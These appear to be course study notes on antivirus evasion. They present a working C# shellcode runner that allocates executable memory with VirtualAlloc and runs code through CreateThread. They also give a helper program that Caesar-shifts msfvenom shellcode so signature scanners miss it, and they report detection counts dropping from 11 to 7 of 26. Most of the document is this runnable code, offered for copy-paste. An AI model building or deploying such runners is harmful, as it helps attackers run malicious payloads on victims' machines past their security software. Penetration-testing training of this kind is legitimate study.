# 05.01 C# Shellcode Runner Caesar Cipher Encoding

> Section 6.5 · custom runner bypasses Avira; +2 Caesar drops detection 11→7

## Overview

A custom C# shellcode runner using VirtualAlloc, CreateThread, and WaitForSingleObject bypasses Avira signature detection (the runner is not from a public project). Encoding the embedded shellcode with a Caesar cipher (shift each byte +2, decode -2 at runtime) reduces AntiScan.Me detections from 11/26 to 7/26 because the raw shellcode bytes are no longer present in the binary. A separate 'Helper' project performs the encryption and prints the encoded shellcode for copy-paste into the runner.

## Steps

- **Custom runner** — VirtualAlloc(0x1000, 0x3000, 0x40) + Marshal.Copy + CreateThread + WaitForSingleObject; bypasses Avira out-of-the-box.
- **Helper project** — separate C# project; iterate buf, add 2, AND 0xFF; output Caesar-encoded shellcode.
- **Format for C#** — StringBuilder + AppendFormat("0x{0:x2}, ") to produce hex array; for VBA use {0:D} decimal format.
- **Decrypt at runtime** — embed encoded shellcode in runner; subtract 2 before execution.
- **Result** — 11/26 without encoding → 7/26 with Caesar cipher.

## Commands

### C# shellcode runner with Caesar decode

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace ConsoleApp1
{
    class Program
    {
        // P/Invoke: allocate RWX memory in the current process
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,  
            uint flAllocationType, uint flProtect);

        // P/Invoke: create a new thread at the specified start address
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,  
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,  
                  uint dwCreationFlags, IntPtr lpThreadId);

        // P/Invoke: block until the thread finishes
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,  
            UInt32 dwMilliseconds);
         
        static void Main(string[] args)
        {
            // Paste Caesar-encrypted msfvenom -f csharp output here (from Helper project)
            byte[] buf = new byte[752] {0xfe, 0x4a, 0x85, 0xe6, 0xf2... };

            // Decryption routine: reverse the +2 Caesar shift at runtime
            for(int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
            }

            int size = buf.Length;

            // Allocate RWX memory (MEM_COMMIT|MEM_RESERVE = 0x3000, PAGE_EXECUTE_READWRITE = 0x40)
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // Copy decoded shellcode into the allocated region
            Marshal.Copy(buf, 0, addr, size);

            // Spawn a thread pointing at the shellcode
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,  
                IntPtr.Zero, 0, IntPtr.Zero);

            // Wait indefinitely for the shellcode thread to exit
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

### Caesar cipher Helper project

```csharp
// Run this separate 'Helper' project once to produce the encoded buf[] for the runner
namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            // Paste raw msfvenom -f csharp output here
            byte[] buf = new byte[752] {
                0xfc,0x48,0x83,0xe4,0xf0...
            };
                 
            byte[] encoded = new byte[buf.Length];
            for(int i = 0; i < buf.Length; i++)
            {
                // Add 2 to each byte; AND 0xFF keeps value in 0-255 range
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
            }

// Format as hex C# array — copy the printed output and paste it as buf[] in the runner
StringBuilder hex = new StringBuilder(encoded.Length * 2);
foreach(byte b in encoded)
{
    hex.AppendFormat("0x{0:x2}, ", b);
}

Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}
```
